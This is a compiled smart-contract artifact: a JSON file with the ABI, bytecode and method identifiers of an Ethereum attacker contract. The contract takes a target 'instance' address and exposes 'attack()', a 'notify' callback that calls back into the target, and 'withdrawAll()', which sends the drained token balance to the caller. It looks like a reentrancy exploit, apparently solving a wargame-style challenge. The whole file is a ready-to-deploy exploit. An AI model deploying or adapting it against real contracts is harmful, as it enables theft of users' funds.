{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"notify","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"withdrawAll","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516103e63803806103e683398101604081905261002e916100e5565b5f80546001600160a01b0319166001600160a01b038316908117909155604080516311df999560e01b815290516311df9995916004808201926020929091908290030181865afa158015610084573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100a891906100e5565b600180546001600160a01b0319166001600160a01b039290921691909117905550610107565b6001600160a01b03811681146100e2575f5ffd5b50565b5f602082840312156100f5575f5ffd5b8151610100816100ce565b9392505050565b6102d2806101145f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063853828b61461004357806398d078b41461004d5780639e5faafc14610060575b5f5ffd5b61004b610068565b005b61004b61005b366004610248565b610184565b61004b6101d4565b6001546040517f70a082310000000000000000000000000000000000000000000000000000000081523060048201525f916001600160a01b0316906370a08231906024016020604051808303815f875af11580156100c8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100ec919061025f565b90508015610181576001546040517fa9059cbb000000000000000000000000000000000000000000000000000000008152336004820152602481018390526001600160a01b039091169063a9059cbb906044016020604051808303815f875af115801561015b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061017f9190610276565b505b50565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af115801561015b573d5f5f3e3d5ffd5b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610224573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101819190610276565b5f60208284031215610258575f5ffd5b5035919050565b5f6020828403121561026f575f5ffd5b5051919050565b5f60208284031215610286575f5ffd5b81518015158114610295575f5ffd5b939250505056fea2646970667358221220ca386e76baf33fe0ebb034989e70c8e7e7033836a1692ea6e37dacb8b67beaf964736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","notify(uint256)":"98d078b4","withdrawAll()":"853828b6"},"id":0}